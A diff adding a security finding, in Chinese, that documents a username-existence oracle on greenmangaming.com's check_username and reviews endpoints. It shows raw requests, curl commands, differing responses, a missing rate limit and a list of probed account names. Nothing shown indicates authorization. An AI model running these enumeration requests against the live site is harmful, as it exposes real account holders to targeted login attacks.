@@ -1,0 +1,43 @@
+# greenmangaming.com 用户名存在性预言机（/api/v2/check_username）
+
+## 结论
+GET /api/v2/check_username?username=<候选> 免认证可达，二值回显 = 用户名存在性预言机，
+无速率限制（连续 10 次无 429），可批量枚举站内有效账号。
+
+## 请求 / 响应
+# 存在的用户名
+GET /api/v2/check_username?username=admin HTTP/1.1
+Host: www.greenmangaming.com
+User-Agent: $ARTEX_UA
+
+HTTP 400
+Username already exists. Please enter a different user name.   # len=60
+
+# 不存在的用户名
+GET /api/v2/check_username?username=zzqrandom987685 HTTP/1.1
+Host: www.greenmangaming.com
+User-Agent: $ARTEX_UA
+
+HTTP 204
+(empty body)   # len=0
+
+## 批量枚举示例
+$ curl -A "$ARTEX_UA" "https://www.greenmangaming.com/api/v2/check_username?username=admin"
+-> 400 "Username already exists. Please enter a different user name."
+$ curl -A "$ARTEX_UA" "https://www.greenmangaming.com/api/v2/check_username?username=zzqrandom987685"
+-> 204 (empty)
+（连续 10 次请求无 429，限速缺失）
+root/admin/moderator/steam/half/life2/ryan/test → 400（存在）
+support/zzqrandom987685 → 204（可用）
+
+## 第二条 oracle（交叉验证）
+# 存在用户
+GET /api/v2/query_reviews_by_username/admin/1
+-> 200 {"IsSuccess":true,"Bookmark":null,"Score":0,"TotalReviews":0,"Reviews":[]}   # len=74
+
+# 不存在用户
+GET /api/v2/query_reviews_by_username/zzqnope12345/1
+-> 200 null   # len=4
+
+# 对照（不是 oracle）：/query_reviews_by_user/<cloudNineId>/1
+# 对任意数字 id（1/100/1000/999999）恒返回同一 74B 空对象 → 无区分度
